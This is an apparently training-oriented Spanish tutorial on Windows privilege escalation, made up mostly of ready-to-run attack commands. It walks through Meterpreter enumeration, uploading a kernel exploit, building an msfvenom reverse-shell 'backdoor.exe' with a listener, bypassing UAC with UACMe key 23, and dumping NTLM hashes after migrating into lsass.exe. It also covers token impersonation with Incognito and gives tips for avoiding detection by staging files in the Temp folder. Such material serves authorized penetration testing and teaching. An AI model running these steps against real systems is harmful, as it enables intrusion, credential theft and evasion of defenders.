# Windows Privilege Escalation

**La escalada de privilegios** es el proceso de explotar vulnerabilidades o errores de configuración para pasar de un usuario con pocos privilegios a uno con más privilegios, normalmente `SYSTEM` o `Administrator` local. Es una fase crítica del ciclo de ataque y un factor importante en el éxito de una prueba de penetración.

> ⚠️ **Nota**: Todos los comandos asumen que estás trabajando desde una máquina atacante con **Kali Linux** y una sesión Meterpreter activa en el objetivo. Sustituye las IPs y rutas de archivo por tus valores reales.

---

## El kernel de Windows

El **kernel** es el núcleo de un sistema operativo: tiene control total sobre todos los recursos y componentes de hardware del sistema. Actúa como una capa de traducción entre el hardware y el software.

**Windows NT** es el kernel incluido en todas las versiones modernas de Windows. Funciona con dos modos principales:

| Modo | Nivel de acceso | Descripción |
|---|---|---|
| **User Mode** | Limitado | Los programas y servicios se ejecutan aquí con acceso restringido a los recursos del sistema |
| **Kernel Mode** | Sin restricciones | Acceso completo a recursos del sistema, hardware, dispositivos y memoria |

El código ejecutado en **Kernel Mode** funciona con el nivel más alto de privilegios (`SYSTEM`). Los exploits de kernel buscan vulnerabilidades en el kernel de Windows para ejecutar código arbitrario con ese nivel.

> ⚠️ **Precaución**: Los exploits de kernel pueden provocar **bloqueos del sistema y pérdida de datos**. Evítalos en entornos de producción o empresariales salvo que sea absolutamente necesario.

---

## Metodología de escalada

```text
Acceso inicial → Enumeración del sistema → Identificación de vulnerabilidades del kernel → Explotación → Shell SYSTEM
```

### Paso 1: Enumerar el sistema

Una vez tengas una sesión Meterpreter con pocos privilegios:

```bash
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getprivs
```

Copia la salida de `sysinfo` en un archivo de texto en Kali; la necesitarás para Windows-Exploit-Suggester.

### Paso 2: Intentar escalada automática

```bash
meterpreter > getsystem
```

`getsystem` intenta varios métodos integrados para elevar privilegios automáticamente. Si funciona, ya tendrás `SYSTEM`. Si falla, continúa de forma manual.

### Paso 3: Usar local_exploit_suggester

Pasa la sesión a segundo plano y ejecuta el módulo de postexplotación:

```bash
meterpreter > background
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION <session_id>
msf6 > run
```

Esto enumera vulnerabilidades específicas de la versión de Windows y muestra qué módulos de exploit de Metasploit pueden funcionar.

---

## Explotación del kernel con Windows-Exploit-Suggester

**Windows-Exploit-Suggester** compara el nivel de parches del objetivo con la base de datos de vulnerabilidades de Microsoft para detectar parches faltantes y exploits públicos disponibles.

> GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Paso 1: Instalar y actualizar la base de datos

```bash
# En Kali
pip install xlrd
./windows-exploit-suggester.py --update
# Genera un archivo .xlsx con fecha, por ejemplo: 2024-01-01-mssb.xlsx
```

### Paso 2: Obtener la información del sistema del objetivo

```bash
meterpreter > sysinfo
# Copia toda la salida en un archivo en Kali
```

```bash
# En Kali — guardar la salida de sysinfo
echo "<pega aquí la salida de sysinfo>" > systeminfo.txt
```

### Paso 3: Ejecutar Windows-Exploit-Suggester

```bash
./windows-exploit-suggester.py --database 2024-01-01-mssb.xlsx --systeminfo systeminfo.txt
```

La herramienta mostrará las vulnerabilidades para las que el sistema no tiene parches, junto con los exploits disponibles. Los resultados están ordenados; las **primeras entradas suelen ser las más fiables**.

### Paso 4: Descargar y transferir el exploit

Ejemplo usando **MS16-135**:

```bash
# En Kali — descargar el binario compilado del exploit
# Transferirlo al objetivo mediante Meterpreter
meterpreter > upload /root/MS16-135.exe C:\\Users\\admin\\AppData\\Local\\Temp\\MS16-135.exe
meterpreter > shell
C:\\> C:\\Users\\admin\\AppData\\Local\\Temp\\MS16-135.exe
```

> **Sube siempre los archivos a la carpeta Temp**: está menos monitorizada y es menos probable que la detecten el usuario o las herramientas de seguridad.

> Colección de exploits de kernel de Windows ordenados por CVE: https://github.com/SecWiki/windows-kernel-exploits

---

## Bypass de UAC con UACMe

### ¿Qué es UAC?

**UAC (User Account Control)** es una función de seguridad de Windows introducida en Vista que impide cambios no autorizados en el sistema operativo. Cuando un programa requiere privilegios elevados:

| Tipo de usuario | Comportamiento de UAC |
|---|---|
| **Usuario sin privilegios** | Se solicitan **credenciales de administrador** |
| **Administrador local** | Se solicita **confirmación** (Sí/No) |

UAC tiene niveles de integridad que van de **Low → Medium → High → System**. Si el nivel de protección de UAC está configurado **por debajo de High**, algunos programas pueden ejecutarse con privilegios elevados sin pedir confirmación al usuario.

### ¿Qué es UACMe?

**UACMe** es una herramienta de código abierto para escalada de privilegios que permite saltarse UAC en Windows 7 a 10. Aprovecha el mecanismo integrado de **AutoElevate** de Windows, una función que permite que ciertos binarios confiables se eleven automáticamente sin mostrar el aviso de UAC.

> GitHub: https://github.com/hfiref0x/UACME

UACMe contiene **más de 60 métodos** (keys), y cada uno apunta a un binario o técnica distinta de Windows. La key que uses depende de la **versión de Windows** del objetivo.

### Referencia de keys de UACMe

| Key | Método | Versión de Windows |
|---|---|---|
| **23** | `autoelevate` mediante `sysprep.exe` | Windows 7, 8, 8.1, 10 |
| **24** | `autoelevate` mediante `MMC` | Windows 7, 8, 8.1, 10 |
| **30** | `autoelevate` mediante `IFileOperation` | Windows 7, 8, 8.1 |
| **41** | `autoelevate` mediante `sfc.exe` | Windows 7, 8, 8.1, 10 |
| **43** | `autoelevate` mediante `APPINFO` | Windows 10 |
| **61** | `autoelevate` mediante el registro de `WOW64` | Windows 10 |

> La key **23** (`sysprep.exe`) es la más usada en laboratorios, porque funciona en Windows 7, 8, 8.1 y 10.

### Sintaxis de uso

```bash
Akagi32.exe <key> <ruta_completa_al_payload>
Akagi64.exe <key> <ruta_completa_al_payload>
```

Usa `Akagi32.exe` para objetivos de 32 bits y `Akagi64.exe` para objetivos de 64 bits.

---

### Flujo completo de bypass de UAC

#### Paso 1: Obtener la sesión inicial de Meterpreter

```bash
msfconsole
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 > set RHOSTS <target_ip>
msf6 > set LHOST <tu_ip>
msf6 > exploit
```

Confirma que estás en el grupo de administradores locales, pero sin privilegios elevados:

```bash
meterpreter > getuid
meterpreter > getsystem   # Fallará — UAC está bloqueando la elevación
```

#### Paso 2: Migrar a un proceso estable

```bash
meterpreter > pgrep explorer
meterpreter > migrate <explorer_pid>
```

Migrar a `explorer.exe` te da una sesión más estable bajo el contexto del usuario.

#### Paso 3: Generar un payload malicioso

En Kali:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<tu_ip> \
  LPORT=1234 \
  -f exe > backdoor.exe
```

#### Paso 4: Subir UACMe y el payload al objetivo

```bash
meterpreter > cd C:\\Users\\admin\\AppData\\Local\\Temp
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
meterpreter > upload /root/backdoor.exe
```

#### Paso 5: Levantar un listener en Kali

```bash
msfconsole
msf6 > use multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST <tu_ip>
msf6 > set LPORT 1234
msf6 > exploit -j
```

#### Paso 6: Ejecutar el bypass de UAC

Vuelve a la sesión original de Meterpreter y abre una shell:

```bash
meterpreter > shell
C:\\Users\\admin\\AppData\\Local\\Temp> Akagi64.exe 23 C:\\Users\\admin\\AppData\\Local\\Temp\\backdoor.exe
```

La key `23` activa `sysprep.exe` con AutoElevate y lanza `backdoor.exe` con privilegios elevados, evitando por completo el aviso de UAC.

#### Paso 7: Extraer hashes desde la sesión elevada

En la nueva sesión elevada de Meterpreter:

```bash
meterpreter > pgrep lsass
meterpreter > migrate <lsass_pid>
meterpreter > hashdump
```

Migrar a `lsass.exe` es necesario porque administra las credenciales de autenticación; al entrar en él, puedes volcar los hashes NTLM de todos los usuarios.

---

## Impersonación de tokens de acceso

### ¿Qué son los tokens de acceso en Windows?

Los **tokens de acceso** los crea `winlogon.exe` cada vez que un usuario se autentica. Representan el **contexto de seguridad** de un proceso o hilo: identidad y privilegios. Todos los procesos hijos heredan una copia del token del proceso padre.

Los tokens están gestionados por **LSASS (Local Security Authority Subsystem Service)**.

### Tipos de token

| Tipo de token | Creado por | Puede impersonar en |
|---|---|---|
| **Impersonation-level** | Inicio de sesión no interactivo (servicios, inicios de sesión de dominio) | Solo sistema local |
| **Delegate-level** | Inicio de sesión interactivo (consola, RDP) | Cualquier sistema — **máximo riesgo** |

Los tokens de nivel **Delegate** son los más peligrosos porque pueden usarse para impersonar usuarios en toda la red.

### Privilegios necesarios

Para realizar impersonación de tokens, necesitas al menos uno de estos:

| Privilegio | Descripción |
|---|---|
| **SeAssignPrimaryToken** | Permite impersonar tokens |
| **SeCreateToken** | Permite crear tokens arbitrarios con privilegios de administrador |
| **SeImpersonatePrivilege** | Permite crear un proceso bajo el contexto de seguridad de otro usuario — **el más común** |

Comprueba tus privilegios actuales:

```bash
meterpreter > getprivs
```

Busca `SeImpersonatePrivilege` en la salida.

### Impersonación con Incognito

**Incognito** es un módulo de Metasploit que lista e impersona tokens disponibles después de una explotación exitosa.

#### Paso 1: Cargar Incognito

```bash
meterpreter > load incognito
```

#### Paso 2: Listar los tokens disponibles

```bash
meterpreter > list_tokens -u
```

La salida muestra dos categorías:
- **Delegation Tokens** — inicios de sesión interactivos (los más útiles).
- **Impersonation Tokens** — inicios de sesión no interactivos.

#### Paso 3: Impersonar un token

```bash
meterpreter > impersonate_token "DOMAIN\\Administrator"
```

Usa exactamente el nombre del token que aparece en `list_tokens`, con doble barra invertida.

#### Paso 4: Verificar la elevación

```bash
meterpreter > getuid
meterpreter > migrate <explorer_pid>
```

Migrar a `explorer.exe` después de impersonar ayuda a estabilizar la sesión elevada.

> **Si no hay tokens útiles disponibles**: usa el **Potato Attack** (Juicy Potato, Rotten Potato), una técnica que fuerza la creación de un token privilegiado abusando de interacciones con servicios de Windows. Esto se cubre en otra lección.

---

## Resumen de técnicas de escalada

| Técnica | Herramienta | Requisito | Resultado |
|---|---|---|---|
| **Escalada automática** | `getsystem` | Sesión Meterpreter con pocos privilegios | SYSTEM (si no está parcheado) |
| **Exploit de kernel** | Windows-Exploit-Suggester + binario exploit | Parches faltantes | SYSTEM |
| **Bypass de UAC** | UACMe (Akagi) | Pertenencia al grupo de administradores locales | Administrador elevado |
| **Impersonación de tokens** | Incognito (MSF) | `SeImpersonatePrivilege` | Administrador / SYSTEM |
| **Local exploit suggester** | Módulo post de MSF | Sesión Meterpreter activa | Lista los exploits viables |

---

## Ideas clave

- **La escalada de privilegios** eleva el acceso de un usuario con pocos privilegios a `Administrator` o `SYSTEM`.
- **Windows NT** funciona en User Mode (restringido) y Kernel Mode (sin restricciones). Los exploits de kernel ejecutan código en el nivel más alto de privilegios.
- **`getsystem`** intenta una escalada automática; pruébalo primero. Si falla, continúa de forma manual.
- **`local_exploit_suggester`** enumera todos los módulos de exploit de Metasploit viables para esa versión concreta de Windows.
- **Windows-Exploit-Suggester** compara el nivel de parches del objetivo con la base de datos de vulnerabilidades de Microsoft y muestra parches faltantes con exploits disponibles.
- **Súbelo siempre a `C:\\Users\\<usuario>\\AppData\\Local\\Temp`**: está menos monitorizado y es menos probable que se detecte.
- **UAC** evita elevaciones no autorizadas. UACMe lo elude abusando de binarios confiables con AutoElevate de Windows.
- **La key 23 de UACMe** (`sysprep.exe`) funciona en Windows 7/8/8.1/10 y es la más usada en laboratorios.
- **Los tokens de acceso** definen el contexto de seguridad de los procesos. Los tokens de nivel Delegate, obtenidos de inicios de sesión interactivos, son los más potentes.
- **`SeImpersonatePrivilege`** es el privilegio clave para ataques de impersonación de tokens.
- **Incognito** lista e impersona tokens disponibles. Migra a `explorer.exe` después de impersonar para estabilizar la sesión.
- **Migra a `lsass.exe`** antes de ejecutar `hashdump` para extraer los hashes NTLM de todos los usuarios.
